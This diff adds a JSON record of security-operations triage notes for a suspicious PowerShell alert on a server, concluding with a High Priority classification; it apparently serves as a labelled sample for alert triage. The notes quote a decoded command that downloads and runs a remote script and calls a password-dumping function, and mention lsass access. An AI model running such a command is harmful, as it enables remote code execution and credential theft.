@@ -1,0 +1,19 @@
+{
+  "investigation_notes": {
+    "Alert ID": "SOC-10004",
+    "Start Time": "2026-01-27T13:45:10.000Z",
+    "Alert Name": "Suspicious PowerShell Script Execution",
+    "Source IP": "10.50.11.92",
+    "Endpoint": "SRV-APPS-02",
+    "User": "s_keller",
+    "Playbook Used": "Suspicious PowerShell Triage",
+    "Initiating Process": "powershell.exe",
+    "Parent Process": "wmiprvse.exe",
+    "Process SHA256": "9785001b0dcf755eddb8af294a373c0b87b2498660f724e76c4d53f9c217c7a3",
+    "Decoded Command": "iex (New-Object Net.WebClient).DownloadString('http://172.16.8.92/PowerSpread.ps1'); Get-GWPasswords",
+    "Hash Reputation Summary": "VirusTotal: 0 engines flagged | Community score -24 with 29 community votes labeled Malicious and 20 labeled Harmless (mixed community feedback, leans suspicious).",
+    "Notable Recent Events": "Shortly before the PowerShell execution there were commands enumerating local groups (net localgroup administrators) and a ProcessAccess event showing high-privilege access to lsass.exe (granted_access 0x1fffff), indicating possible credential discovery or theft activity.",
+    "Description": "An encoded PowerShell command was executed that decodes to an invocation which downloads and executes a remote script from http://172.16.8.92/PowerSpread.ps1. The process was spawned by wmiprvse.exe with no file path reported, suggesting possible direct-to-memory or script-based execution, and recent events show local group enumeration and high-privilege access to lsass.exe on the same host. The combination of an inline download+execute, suspicious parent process, evidence of credential access attempts, and community-leaning malicious hash feedback supports escalating this to High Priority for further investigation."
+  },
+  "classification": "HP"
+}
